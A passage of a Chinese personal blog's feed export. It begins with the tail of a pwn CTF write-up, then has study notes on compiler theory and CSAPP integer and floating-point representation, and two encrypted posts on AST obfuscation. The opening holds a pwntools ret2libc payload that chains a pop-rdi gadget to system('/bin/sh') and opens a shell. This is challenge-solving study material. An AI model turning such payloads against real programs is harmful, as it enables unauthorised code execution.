class="string">&#x27;libc&#x27;</span>,addr_base)</span><br><span class="line">sys_addr = libc.dump(<span class="string">&#x27;system&#x27;</span>) + addr_base</span><br><span class="line">binsh_addr = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) + addr_base</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(rdi_ret) + p64(binsh_addr) + p64(sys_addr) + p64(encrypt_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>,payload2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h3><p><img data-src="/./../images/image-20230113203306010.png" alt="image-20230113203306010"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;pwn&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>编译2</title>
    <link href="https://pa1r0t.github.io/2023/01/12/%E7%BC%96%E8%AF%91%E5%81%8F2/"/>
    <id>https://pa1r0t.github.io/2023/01/12/%E7%BC%96%E8%AF%91%E5%81%8F2/</id>
    <published>2023-01-12T14:07:41.000Z</published>
    <updated>2023-01-14T12:49:16.099Z</updated>
    
    <content type="html"><![CDATA[<p>高级语言描述</p><span id="more"></span><h3 id="编译基础知识"><a href="#编译基础知识" class="headerlink" title="编译基础知识"></a>编译基础知识</h3><ol><li>高级语言：程序语言是一个记号系统</li><li>语法<ul><li>语法使得这串字符形成一个形式上正确的程序。</li><li>语法＝词法规则＋语法规则</li><li>例如：<ul><li>0.5*x1+c *</li><li>0.5、x1、c、+是语言的单词符号 </li><li>0.5*x1+c是语言的语法单位</li></ul></li><li>语法单位：表达式、子句、语句、函数、过程、程序</li><li>语言的词法规则和语法规则定义了程序的形 式结构，是判断输入字符串是否构成一个形 式上正确的程序的依据。</li></ul></li><li>语义</li></ol><h3 id="字母表和符号表"><a href="#字母表和符号表" class="headerlink" title="字母表和符号表"></a>字母表和符号表</h3><p>一些概念：</p><ol><li><p>字母表：是符号的非空有穷集合，是符号的非空有穷集合</p></li><li><p>符号串：顾名思义。空串：不含有任何符号的串称作空串，记作ε</p></li><li><p>句子：字母表上符合某种规则构成的串。串就是句子</p><p>（注：约定用a,b,c…表示符号；用α,β,γ…表示符号串； 用A,B,C…表示其集合）</p></li></ol><p>符号串集合的运算：</p><p><img data-src="/./../images/image-20230112222858340.png" alt="image-20230112222858340"></p><p>符号串集合的运算：</p><p>例如：A&#x3D;{a,b}; B&#x3D;{c,e,d}</p><p>则AB&#x3D;{ac,ae,ad,bc,be,bd}</p><p>A中的元素必须在B元素的前面，否则是错的，这个顺序要搞对</p><p>例如：串集A＝{a}的各次方幂定义为：</p><p>– A0&#x3D;{ε} </p><p>– A1&#x3D;A&#x3D;{a}</p><p> – …… </p><p>– An&#x3D;AAn-1(n&gt;0)&#x3D;{a…a}</p><p>字母表的闭包与正闭包</p><ol><li>字母表A的闭包（A<em>）：A</em>&#x3D;A0∪A1∪A2∪… 即：由A上符号组成的所有串的集合（包括空串 ε ）</li><li>字母表A的正闭包（A+）：A+&#x3D; A1 ∪A2∪ …&#x3D;A*-{ε}   即：由A上符号组成的所有串的集合（不包括空 串ε ）</li><li>字母表上语言：是字母表上正闭包的子集</li></ol><h3 id="文法与语言的关系"><a href="#文法与语言的关系" class="headerlink" title="文法与语言的关系"></a>文法与语言的关系</h3><p>文法：</p><ul><li>其语法规则如下：<ul><li>– &lt;句子&gt;→&lt;主语&gt;&lt;谓语&gt; </li><li>– &lt;主语&gt; →&lt;形容词&gt;&lt;名词&gt;</li><li>– &lt;谓语&gt; →&lt;动词&gt;&lt;宾语&gt;</li><li>– &lt;宾语&gt; → &lt;形容词&gt;&lt;名词&gt;</li><li>– &lt;形容词&gt; →Young | pop</li><li>– &lt;名词&gt; →men | music </li><li>– &lt;动词&gt; →like</li></ul></li></ul><p>相关概念：</p><ol><li>非终结符<ul><li>出现在规则的左部、用&lt;&gt;括起来、表示一定 语法概念的词</li><li>非终结符集合用VN表示。</li></ul></li><li>终结符<ul><li>语言中不可再分割的字符串(包括单个字符 组成的串)。注：终结符是组成句子的基本单位</li><li>终结符集合用VT表示。</li></ul></li><li>开始符号</li></ol><p><img data-src="/./../images/image-20230114204912084.png" alt="image-20230114204912084"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;高级语言描述&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>csapp1</title>
    <link href="https://pa1r0t.github.io/2023/01/09/csapp1/"/>
    <id>https://pa1r0t.github.io/2023/01/09/csapp1/</id>
    <published>2023-01-09T06:30:39.000Z</published>
    <updated>2023-01-17T07:43:40.272Z</updated>
    
    <content type="html"><![CDATA[<p>学习一下csapp,第一篇</p><span id="more"></span><p>在32位系统：-2147483648&lt;2147483647结果为false</p><p>​int i &#x3D; -2147483648;i&lt;2147483647结果为true</p><p>​-2147483648-1&lt;2147483647结果为true</p><p>在计算机中运算是会发生溢出，假如运算后的数超过了32位，那最终结果可能是一个负数，或者是其他正整数</p><p>我们用linux中的gdb软件来证明其中的结论</p><p><img data-src="/./../images/image-20230109200402530.png" alt="image-20230109200402530"></p><p>很显然，上述超乎我们的预想</p><p>然而在整数运算时是符合交换律的，但是在计算机中浮点数却不符合交换律</p><p>这里做一个实验：用(1e20 + -1e20) + 3.14</p><p>结果为：3.1400000000000001</p><p>再用1e20 + (-1e20 + 3.14)，这里3.14对于-1e20微不足道</p><p>结果为：0</p><p>他们用有限的位组合形式表示在数域中无线扩张的数</p><p><img data-src="/./../images/image-20230109202910325.png" alt="image-20230109202910325"></p><h3 id="定点数和浮点数"><a href="#定点数和浮点数" class="headerlink" title="定点数和浮点数"></a>定点数和浮点数</h3><p>计算机中只能通过约定小数点的位置来表示</p><ul><li>小数点位置约定在固定位置的数称为定点数</li><li>小数点位置约定为可浮动的数称为浮点数</li><li>定点小数用来表示浮点数的尾数部分</li><li>任何实数：X&#x3D;(-1)^s^ ×M×R^E^</li></ul><p>其中，S取值为0或1，用来决定数X的符号；M是一个二进制定点小数 ，称为数X的尾数（mantissa）；E是一个二进制定点整数，称为数X 的阶或指数（exponent）；R是基数（radix、base），可以为2、4和16等,计算机中只要表示S、M和E三个信息，就能确定X的值，叫浮点数</p><h3 id="定点数的编码表示"><a href="#定点数的编码表示" class="headerlink" title="定点数的编码表示"></a>定点数的编码表示</h3><p>浮点数（可用一个定点小数和一个定点整数来表示）</p><p>定点数的编码（解决正负号问题）: 原码、补码、移码、反码 （很少用）</p><h4 id="原码表示："><a href="#原码表示：" class="headerlink" title="原码表示："></a>原码表示：</h4><p><img data-src="/./../images/image-20230114214440623.png" alt="image-20230114214440623"></p><ul><li>其中由上图得0有两种表示，不唯一</li><li>加减方式，对于同号，取绝对值相加，然后在加上符号，对于异号，是比较哪个绝对值大，然后大的间小的，然后再加上绝对值大的符号。这样加减方式繁琐不统一</li></ul><p>&#x3D;&#x3D;从 50年代开始，整数都采用补码来表示 但浮点数的尾数用原码定点小数表示&#x3D;&#x3D;</p><h3 id="补码-模运算（modular运算）"><a href="#补码-模运算（modular运算）" class="headerlink" title="补码 - 模运算（modular运算）"></a>补码 - 模运算（modular运算）</h3><p>在一个模运算系统中，一个数与它除以“模”后的余数等价</p><p>一个负数的补码等于模减该负数的绝对值</p><p>对于某一确定的模，某数减去小于模的另一数，总可 以用该数加上另一数负数的补码来代替</p><p><strong>补码（modular运算）：+ 和– 的统一</strong></p><p>例1：“钟表”模运算系统 假定时针只能顺拨，从10点倒拨4格后是几点？ </p><p>10- 4 &#x3D; 10+(12- 4) &#x3D; 10+8 &#x3D; 6（mod 12）</p><p><img data-src="/./../images/image-20230114220017752.png" alt="image-20230114220017752"></p><h3 id="结论：一个负数的补码等于将对应正数补码-各位取反、末位加一"><a href="#结论：一个负数的补码等于将对应正数补码-各位取反、末位加一" class="headerlink" title="结论：一个负数的补码等于将对应正数补码 各位取反、末位加一"></a>结论：一个负数的补码等于将对应正数补码 各位取反、末位加一</h3><p>补码的定义 假定补码有n位，则：[X]补&#x3D; 2n + X （-2n-1≤X＜2n-1 ，mod 2n）</p><p>X是真值，[x]补是机器数</p><h2 id="求特殊数的补码"><a href="#求特殊数的补码" class="headerlink" title="求特殊数的补码"></a>求特殊数的补码</h2><p>假定机器数有n位：</p><p>① [-2^n-1^]<del>补</del>&#x3D; 2^n^ - 2^n-1^ &#x3D; 10…0（n-1个0） （mod 2^n^）</p><p>② [-1]<del>补</del>&#x3D; 2^n^ - 0…01 &#x3D; 11…1（n个1） （mod 2^n^)</p><p>③ [+0]<del>补</del>&#x3D; [-0]<del>补</del>&#x3D; 00…0（n个0）</p><h2 id="变形补码的表示"><a href="#变形补码的表示" class="headerlink" title="变形补码的表示"></a>变形补码的表示</h2><p>变形（4’s）补码：双符号，用于存放可能溢出的中间结果</p><p><img data-src="/./../images/image-20230117124905779.png" alt="image-20230117124905779"></p><p>求真值的补码:</p><p>简便方法：从右向左遇到第一个1的前面各位取反</p><p>求补码的真值:</p><p>简便求法： 符号为0，则为正数，数值部分相同 符号为1，则为负数，数值各位取反，末位加1</p><p><img data-src="/./../images/image-20230117125216871.png" alt="image-20230117125216871"></p><h2 id="移码表示Excess"><a href="#移码表示Excess" class="headerlink" title="移码表示Excess"></a>移码表示Excess</h2><ul><li>什么是移码表示？<ul><li>将每一个数值加上一个偏置常数（ Excess &#x2F; bias）</li></ul></li><li>通常，当编码位数为n时，bias取 2^n-1^ 或 2^n-1^-1（如 IEEE 754)</li></ul><p><img data-src="/./../images/image-20230117125707755.png" alt="image-20230117125707755"></p><ul><li>为什么要用移码来表示指数（阶码）?<ul><li>便于浮点数加减运算时的对阶操作（比较大小）</li></ul></li></ul><p><img data-src="/./../images/image-20230117125855689.png" alt="image-20230117125855689"></p><h2 id="带符号整数"><a href="#带符号整数" class="headerlink" title="带符号整数"></a>带符号整数</h2><p>有三种定点编码方式：</p><ul><li>Signed and magnitude （原码）：定点小数，用来表示浮点数的尾数</li><li>Excess (biased) notion （移码）：定点整数，用于表示浮点数的阶（指数）</li><li>Two’s complement （补码）：50年代以来，所有计算机都用补码来表示带符号整数</li></ul><p>为什么用补码表示带符号整数？</p><ul><li>补码运算系统是模运算系统，加、减运算统一</li><li>数0的表示唯一，方便使用</li><li>比原码多表示一个最小负数</li></ul><p>无符号数:常在一个数的后面加一个“u”或“U”表示无符号数</p><p>&#x3D;&#x3D;若同时有无符号和带符号整数，则C编译器将带符号整数强制转换为无符号数&#x3D;&#x3D;</p><p><img data-src="/./../images/image-20230117152023145.png" alt="image-20230117152023145"></p><p>带*的与预想的不同</p><p><img data-src="/./../images/image-20230117152423930.png" alt="image-20230117152423930"></p><h4 id="编译器处理常量时默认的类型"><a href="#编译器处理常量时默认的类型" class="headerlink" title="编译器处理常量时默认的类型"></a>编译器处理常量时默认的类型</h4><p><img data-src="/./../images/image-20230117153309750.png" alt="image-20230117153309750"></p><p>C表达式-2147483648 &lt; 2147483647的执行结 果为false，这是因为编译器在编译时，是把符号和字面量分开识别，先识别字面量2147483648，2147483648在C90中时2^31^,属于unsigned int，所以此次比较是根据无符号数来进行比较。</p><p>若定义变量“int i&#x3D;-2147483648;”，则“i &lt; 2147483647”的执行 结果为true，这个不用解释，int类型已经定义好类型了，不需要再判别</p><p>如果将表达式写成“-2147483647-1 &lt; 2147483647”，则结果会怎 样呢？是true</p><p>不过C99的标准不一样，看上面的表就知道</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习一下csapp,第一篇&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>编译篇1</title>
    <link href="https://pa1r0t.github.io/2023/01/09/%E7%BC%96%E8%AF%91%E7%AF%871/"/>
    <id>https://pa1r0t.github.io/2023/01/09/%E7%BC%96%E8%AF%91%E7%AF%871/</id>
    <published>2023-01-09T02:16:11.000Z</published>
    <updated>2023-01-14T11:28:58.372Z</updated>
    
    <content type="html"><![CDATA[<p>引论学习</p><span id="more"></span><h3 id="程序设计语言的转换"><a href="#程序设计语言的转换" class="headerlink" title="程序设计语言的转换"></a>程序设计语言的转换</h3><ul><li>编译：从高级语言到低级语言的过程</li><li>解释：接受高级语言的一条语句输入，进行解释并控制计算机执行，马上获得该语句的执行结果，然后接受下一条语句<ul><li>优点：实现人机交互</li><li>缺点：效率差，每次都要解释，而不像编译一样，只需编译一次，以后只需执行即可</li></ul></li><li>编译的转换过程：<ul><li>两阶段转换：编译一一执行<img data-src="/./../images/image-20230109130459860.png" alt="image-20230109130459860"></li><li>三个阶段的转换：编译一一汇编一一运行<img data-src="/./../images/image-20230109131018804.png" alt="image-20230109131018804"></li></ul></li></ul><h3 id="编译程序概述"><a href="#编译程序概述" class="headerlink" title="编译程序概述"></a>编译程序概述</h3><p>自然语言的翻译：</p><ol><li>识别句子中一个个单词</li><li>分析句子的语法结构</li><li>根据句子的含义进行初步翻译</li><li>对译文进行修饰</li><li>写出最后译文</li></ol><p>编译程序的工作：</p><ul><li>词法分析</li><li>语法分析</li><li>语义分析和中间代码的生成</li><li>优化</li><li>目标代码的生成</li></ul><p><img data-src="/./../images/image-20230109173201830.png" alt="image-20230109173201830"></p><p>词法分析：</p><ul><li>任务：对源程序的字符串进行扫描和分解，识别出一个个单词</li><li>基本字：void,int,float</li><li>标识符：a,b,c,d</li><li>长整数：50</li><li>运算符：+，-，*，&#x3D;</li><li>界限符：{}，；（）</li><li>词法分析依照词法规则，识别出正确的单词，转换成统一规格，备用</li><li>转换：<ul><li>对基本字、运算符、界限符的转换</li><li>标识符的转换</li><li>常数的转换</li><li>转换完成的格式（类号、内码）</li></ul></li><li>描述词法规则的有效工具是正规式和有限自动机</li></ul><p>语法分析：</p><ul><li>任务：词法分析后的单词，根据语言的语法规则，把单词符号组成各类语法单位：子句、语句</li><li>语法规则：规定单词如何组成句，称为文法</li><li>语法规则的表示：<ul><li>BNF:A::&#x3D;B|C表示A定义为B或C</li></ul></li><li>语法分析的方法：<strong>推导</strong>和<strong>规约</strong></li><li>推导：最左推导和最右推导</li><li>规约：最右规约和最左规约</li></ul><p>赋值语句的语法规则：</p><ul><li>A::&#x3D;V&#x3D;E</li><li>E::&#x3D;T|E+T</li><li>T::&#x3D;F|T*F</li><li>F::&#x3D;V|(E)|C</li><li>V::&#x3D;标识符</li><li>C::&#x3D;常数</li></ul><h4 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h4><p>​x &#x3D; a + b*50根据上面的文法规则运用最右推导：最右推导就是每次只变换最右的字母</p><p>A&#x3D;&gt;V&#x3D;E&#x3D;&gt;V&#x3D;E+T&#x3D;&gt;V&#x3D;E+T*F&#x3D;&gt;</p><p>T&#x3D;E+T*C&#x3D;&gt;</p><p>T&#x3D;E+T*50&#x3D;&gt;</p><p>T&#x3D;E+F*50&#x3D;&gt;</p><p>T&#x3D;E+V*50&#x3D;&gt;</p><p>T&#x3D;E+b*50&#x3D;&gt;</p><p>T&#x3D;T+b*50&#x3D;&gt;</p><p>T&#x3D;V+b*50&#x3D;&gt;</p><p>T&#x3D;a+b*50</p><p>如何最左规约，就是从T&#x3D;a+b*50变换到A,也就是赋值运算成立，每次只变换最左边的字母，是最右推导的逆运算</p><p>计算机是用语法树来检验语法：</p><p><img data-src="/./../images/image-20230109181128958.png" alt="image-20230109181128958"></p><h3 id="中间代码生成"><a href="#中间代码生成" class="headerlink" title="中间代码生成"></a>中间代码生成</h3><ul><li>任务：根据语法分析其中的含义，进行初步翻译，产生介于源代码和目标代码之间的一种代码</li><li>分为两阶段的工作：<ul><li>对每种语法范畴进行静态语义检查</li><li>如果语义正确，就进行中间代码的翻译</li></ul></li><li>中间代码形式：四元式、三元式、逆波兰式</li></ul><p>将x&#x3D;a+b*50变成中间代码：</p><table><thead><tr><th align="center">序号</th><th align="center">算符</th><th align="center">左操作数</th><th align="center">右操作数</th><th align="center">结果</th></tr></thead><tbody><tr><td align="center">（1）</td><td align="center">将整常数50转换为实常数</td><td align="center"></td><td align="center"></td><td align="center">T<del>1</del></td></tr><tr><td align="center">（2）</td><td align="center">*</td><td align="center">b</td><td align="center">T<del>1</del></td><td align="center">T<del>2</del></td></tr><tr><td align="center">（3）</td><td align="center">+</td><td align="center">a</td><td align="center">T<del>2</del></td><td align="center">T<del>3</del></td></tr><tr><td align="center">（4）</td><td align="center">&#x3D;</td><td align="center">T<del>3</del></td><td align="center"></td><td align="center">x</td></tr></tbody></table><p>以上就是四元式</p><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><ul><li>对中间代码进行加工变换，变换出效率更高的代码</li><li>原则：等价变换，在不改变原意的情况下</li><li>主要方面：<ul><li>公共子表达式的提取：x&#x3D;<strong>(a+b)</strong>*c+<strong>(a+b)</strong>*d</li><li>合并已知量：c&#x3D;a+b   d &#x3D; a+b   未改变a，b的值</li><li>删除无用语句：一些注释或者一些与程序本身无关的表达式</li><li>循环优化</li></ul></li></ul><p>例如将以下语句转成中间代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>( k = <span class="number">1</span>; k &lt;= <span class="number">100</span>; k++)&#123;</span><br><span class="line">m = i + <span class="number">10</span>*k;</span><br><span class="line">n = j + <span class="number">10</span>*k;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="/./../images/image-20230110193728210.png" alt="image-20230110193728210"></p><p>优化：每次乘实际上都是在上一次的基础是+10,所以能将乘操作优化成加法操作，来达到提升效率的目的</p><p><img data-src="/./../images/image-20230110193939323.png" alt="image-20230110193939323"></p><h3 id="目标代码生成"><a href="#目标代码生成" class="headerlink" title="目标代码生成"></a>目标代码生成</h3><ul><li>任务：把优化的中间代码转化成特定机器上的低级语言</li><li>目标指令的形式：<ul><li>绝对指令代码：就是01010的机器代码如exe文件，可立即执行</li><li>汇编指令代码：汇编语言程序，需要通过汇编程序汇编后才能运行</li><li>可重定位指令代码：先将各目标模块连接起来，确定变量、常数在主存中的位置，装入主存后才能成为可以运行的绝对指令代码</li></ul></li></ul><h3 id="表格与表格管理"><a href="#表格与表格管理" class="headerlink" title="表格与表格管理"></a>表格与表格管理</h3><ul><li>表格作用：用来记录源程序的各种信息以及编译过程中的各种状况</li><li>与编译前三阶段有关的表格：<ul><li>符号表：用来登记 源程序中的常量名、 变量名、数组名、 过程名等，记录它 们的性质、定义和引用情况<img data-src="/./../images/image-20230110195304443.png" alt="image-20230110195304443"></li><li>常数表与标号表：登记各类常数值，登记标号的定义与作用<img data-src="/./../images/image-20230110195424180.png" alt="image-20230110195424180"></li><li>入口名表：登记过程的层号，分程序符号表入口<img data-src="/./../images/image-20230110195523654.png" alt="image-20230110195523654"></li><li>中间代码表</li></ul></li></ul><h3 id="出错与处理"><a href="#出错与处理" class="headerlink" title="出错与处理"></a>出错与处理</h3><p>错误类型:</p><ul><li>语法错误:在词法分析和语法分析阶段检测出来</li><li>语义错误：一般在语义分析阶段检测</li></ul><p>遍：指对源程序或源程序的中间结果从头到尾扫 描一次，并做有关的加工处理，生成新的中间结 果或目标代码的过程。</p><p>（遍与阶段的含义毫无关系。）</p><p>一遍扫描</p><p><img data-src="/./../images/image-20230110195852519.png" alt="image-20230110195852519"></p><p>&#x3D;&#x3D;一遍扫描不是一次性扫描和分析，而是通过一句一句的表格是进行反复扫描和分析&#x3D;&#x3D;</p><h3 id="编译程序生成"><a href="#编译程序生成" class="headerlink" title="编译程序生成"></a>编译程序生成</h3><p>生成方式：</p><ol><li>直接用机器语言编写编译程序</li><li>用汇编语言编写编译程序<ul><li>注：编译程序核心部分常用汇编语言编写</li></ul></li><li>用高级语言编写编译程序：这是普遍采用的方法</li><li>.自编译：内置核心编译程序，如何用自身的核心程序去编译其他程序</li><li>编译工具：LEX(词法分析)与YACC(用于自动产生LALR分析 表)</li><li>移植（同种语言的编译程序在不同类型的机器之 间移植）</li></ol><p>写编译程序的基本条件：</p><ul><li>源程序语言</li><li>目标程序语言</li><li>编译方法</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;引论学习&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>AST混淆2</title>
    <link href="https://pa1r0t.github.io/2023/01/05/AST%E6%B7%B7%E6%B7%862/"/>
    <id>https://pa1r0t.github.io/2023/01/05/AST%E6%B7%B7%E6%B7%862/</id>
    <published>2023-01-05T09:57:25.000Z</published>
    <updated>2023-01-08T14:31:35.707Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="仅限作者学习使用" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e0a58908372fed50866de4511ecfb94a8e212cc24701a040eabddc056a5c2f66"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">AST的API详解</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>AST混淆1</title>
    <link href="https://pa1r0t.github.io/2023/01/03/AST%E6%B7%B7%E6%B7%861/"/>
    <id>https://pa1r0t.github.io/2023/01/03/AST%E6%B7%B7%E6%B7%861/</id>
    <published>2023-01-03T11:32:24.000Z</published>
    <updated>2023-01-05T06:47:15.734Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="仅限作者学习使用" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fc6571cad3d66c9f74081aa28742181b2b862cae29b1087c0f9ab82dca3da6da">57f4ad225687d507395974160374769bdde747c806f51e0eb4d324a9c57f5d30731ef6fab6b17f66be8209f17fe8814fda10badb491cc62f99ceb8f56e15e6008b4b8453ae9509cc6a7ac2e78b414552dae50c920c1f453fff0aeb3078c6787c1ad1c33f9e59a86848623be2d091ee8d06a2d917a54abdd3e57c3dc8849273fe3702b53b23cb0cc2a93ed44d3716e012df99cedae92d92689248aa39f204fcc2f18014332447c52b69434fcadf1905ef6ed72464f6bba17b230dedd3106df669df535324ee861cfdede87a049e11cf7ae8307dc28119a31a7a8e64e220cf4e3c7de0a9bde71d1442642ad4878468ae2625fb94f6f2edc6575acb2b4176302e66f68cf3947ef5b211bb3ad6e18f0b747534bc54ec83aabbb76f822cc41a100c115b4d5ca7e2f6345eaf68b5f8490bc979c1f4840e767fdd998ac24eac97387bf77a9c5e0c00c9d3bd638eec6d34b66a413f28ee6c83a3ff471648218243414c960ac6fe2add1920d3af67364c4d98d549b36a15d8d3d4526ea51e9bc16d71a76c7a3c6551ff7e6b5ecff6800c13a5f272256c73e5c556f9300a9fe7d34889a94fa7f0531c39d40d8756a4cdc3ba8ef46f047e488f6e2e5f10e29d661f53b814bb91230facaf2feaab926708e90a5c242b4b257af02cf6ba1929e5bfb3c7f0ed1c580e70f76efbd0e5ad911a02e04beb99a2bdd3bf86f26a15f6afd22bd503a9a20c464211c184ea279868986b6437dc48d7a678cdc054455cbae44e5dafff60e1d844425de3cf90694709af4709613cca412cc46afb6b99f76a0fca4f4860b2fd4c0b3e1fff887e7f274468aa10241a24ee586486aa1868c8bddda46ef85b701d4bfc13f91e881c9c0f95992de7700826bdab26e8d7b20e8173f3d1f0675d2502dae9f4cae07a60e4814a3afb4d7b06290fcc3fe305eb297cef103ae584d0009e1a3664e9294d47db2d65c219bbcc46cefe0230404c976b4f8d50af4961aa11e3d1a52b9f2c4ad6c565cdec1d1a9da01fc04f2aa29ef3b9d0c5721f6ad8d247cb8ac6e11f882586c05c55309f1c3761e73479c0d394c0eee47b8e563ae18bd8bc43e8732a613910f39f69061d6ecca1a73189716e9e42db004680cc33c3faa69ab4caf682d5d79ba52b058b5d66612d9a72f4da519f4f7c0ffe1cdddf6951c6e655cf9af817c1250483835fd0c990115340f6c61fdfa03ba04b7db2d40c409eb1f4c995b3ce9e347c34755d35da38ac035d71e191f3a860de9fc18a6eadb44f376081422fb446dab260a8fbf96a785321ca306ce67f4e4d53c6cc2c850c0dbb24cc89a34e0bdc435c70acf70242bc0ff44cc37bc369ded5593e2fa9873f7ec775fa2d780bea1fdf3a97a877578e3ba43984c2e8b3a00d091465a7a20d76cf5724da9a083c3ef3206d154d251555d0ab953ce43c43b7d85253f65551a6d1a8a7e9134ca8c5822ce8500ccc6b0192b7fa429a4434083618899f26be032eb91f8864c75ee8af2db2cf0352933a16e8dfca78e0c6f4fa841ff1d69496a96f698e33dc0ee7bea481a754d6d95c4e7863400b8805d22c5667528d1d6b7509971551cad9e8c05599379792d1a649de241527e8757923cb8db763061533187703f6ad754511ec0763985cde07453286842946271d2ac2531f99f08da0576d77ee524a8ec105d780ee18cb2e3a4689aa918329324fe61a1be1e834443d4f0bcc74880ff1efad85721621f97c36a0e638f6f535eda57c2e1e9a8783f2032776ca2b0fc35f5d539fdf2d1b2730c92785c569057e01513d61fd19e8a95422083c883a28f91f598f1cf5111c60d77a09144fa319e22e0dbfd5056997b0179ef3f3b56fe33842bd6450f3aa35d0ed977d5879b20802b9f061f84caffd342a538aa1265fbe618a78edf82c22f231bdd261b25748c774af88f1b54ddf49d925533909b4324ced6dca550342c11bdcdac7eb74c163e1cef8c740f301fbbea0b4e195e1791c6b451f2701663f247d5013c74c526cd8d327abdb7b3c7faa97358eeccad3d8501527a1131ae0598f2148ad8bf27de18592c2f1022095c195d3b0689252239c38505a775d4bd0742f26fcb46050efbe30c52afefa92ade0716fafc2a751b2fee76428552f0cacb98b056c93761135cf73686680ef4f05940c45eab3903e570b75800b4d68adc502f950a9afc0c6d3fe89a70315590c37b1ac756378cfe1b0e2ada44c8958c102969f9060106c24fe31045f7dbac26756f585296a0c8d5e037f12e5d71ff8367c71ce5ee5164e710e305cf1a05ce9783f8a0f595b6af84cbebbdb5bc140f255b83bd31131ee259ae0222396584d69a946ae25f4c87c30e8518457962ca907f55c057e1fa8045bc1a1c3b5d3d12202a8bc0be86ae20d2ed58df061280a33db9f64c254be9d91296de078a7bcc06e35dd5d3330f20a128dfc8eda266693299378fdc2600385e62472693e5b8d0e0813d558d38c515424345f96b2958a94bd7c487c09e5ea22c0b897c2a41e983a30fc04622f619d509c4cf09a657a940b237cf3a07467571985787721343dd7971d3589016bb6030256a86670c57ee21a8c82af663ebb3d7fd54af4438962e934bf99d78bf91b9bae646d912a1d085f7a14a3995dfce5a73c30df35956926194d03d977c5a9d329e0df940e5e16d277543a011aed9a6eee347a3b3381edef2e7f8b91efd3caa7296fc67c171a9eea0784185243962de6de9077f92707c107edd017a49241ef3c3f05d79222d636ad9b567b9566356861f6b884888b00c20c9420dc576bf90151fd5637eaaebed88f0e4519685309794b9fed3fe9d76a3269b6e1117b7d00b899ae05dc8d57d5fa7f6ad1faa9fafd8a2417b1c459d50ba7344a281b4708293f4719e90173df8f4a66d9dac76e05b09fcba2b5bbdaa7e827be3346054727bdbf3c30ea04ff06bb913601010831f1085fd4f4c9320dfa637216f1a34de703ba1585fbb4076e827e924380d93a458cb9c9c5bb0afb2284c06be4d314196abac3082cd30e66f6a152304d62a36b922eaafce9fc1e7bf7b37e7865f160103027406b4698e27af5f61e15a7c3fedee30211b29dac9baab84ecf8a7e77d77a7d36d69729906d927fbbee2765c4e3d921ceab4c19367c3ad958d429a4b8ce0b0e798b9117d195c52309a333cd9619aa0e8b99c3f452b22fcb1fb851a8bbd522f42ea8e929d08ef00e1976a854076bd4945a9975a2fc5c03eb524378df8494b687bfebf53358156c1877c6c313d2f64adbe015ce4bf31028f555233b2fcd8ee63e28953df80890d2cfb1aea1e6b4132f118e5bf65339634f76f306c275f24dda8418450b59761a20ca5187182db00f6a84198f30287f7606bb218ea209b4bad0c6568af542af726f682fa44d85a3e546752b6642515f946a67fde29b2beff9d7d5b1b6483b828a5f38ad2a9f2c893a05f9dba867a2ec7cc15e7ce255de76846a6e50bc4c86b911ab6be9246b2d1a08f33d774f6c5cbd675f75a69ec20b292a376fe7bc287468df51a52d2e69b9c3b23e2e5c1c54f59ed5571b323132bfb9b1ac38b8fa574893e25a10ac77f6a65d5a7da41fc0558d7449a209580c65f9ca137026edb7d2ba45e0535a6fa5df2c2a5ffede8c7606e8d559b14687e7dfc386cc512f063b93e2fdf941d9e8d38e822136f677b4856eabf20ee947fadb438051ea61371e1e118ef37387c3b068be62a2afada0f957506ed8033fbc5c078b50956a62704fa0467f68dc8b6b970249054bcaef2c9f0fbfcce24ddec0020a5c3dd5695a3dccd3c0151ca67dd0ea9a1180725134e146dae119e7fc9ef2655cdab1c5df05d84762487ee8f8636f864ba2bace98f465b5b257473fa1789c001c9e6ea0de35ea55f1ca1992d6a746b9880117d57346f14139572ba486b5c73a8e514bd5180c86efb4cbdd4095d6ff6cfc31db81e9711335a36f5040e0d680c01ca444d8132ae0c37e5e034d07f1472b3